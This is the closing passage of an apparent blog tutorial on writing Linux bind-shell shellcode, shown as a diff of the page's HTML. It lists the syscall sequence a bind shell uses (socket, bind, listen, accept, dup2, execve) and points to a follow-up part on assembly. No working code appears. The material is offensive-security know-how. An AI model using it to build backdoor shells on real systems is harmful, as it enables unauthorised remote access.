+<p>We can see that the first call being made is the <code>socket</code> call, followed by the <code>bind</code> call, then the <code>listen</code> and <code>accept</code> calls. Then the code loops through the <code>dup2</code> call several times and finally <code>execve</code> is called.</p>
+<p>We finally have our bind shell process:</p>
+<ol>
+<li>Socket</li>
+<li>Bind</li>
+<li>Listen</li>
+<li>Accept</li>
+<li>Dup2</li>
+<li>Execve</li>
+</ol>
+<p>In <a href="http://norsec0de.github.io/posts/part-2-building-the-shellcode/">Part 2: Building the Shellcode</a>, we will investigate these calls further and start building our own assembly shellcode.</p>
+<p>Keep sploiting</p>
+<p>norsec0de</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://norsec0de.github.io/tags/assembly/">assembly</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/tags/shellcode/">shellcode</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/tags/tutorial/">tutorial</a></span>
+        
+    </p>
+
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://norsec0de.github.io/categories/shellcode/">shellcode</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/categories/tutorial/">tutorial</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="http://norsec0de.github.io/">norsey</a></span>
+            
+            <span><a href="http://norsec0de.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>norsey's hideout</span>
+            <span>hugo</span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="http://norsec0de.github.io/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
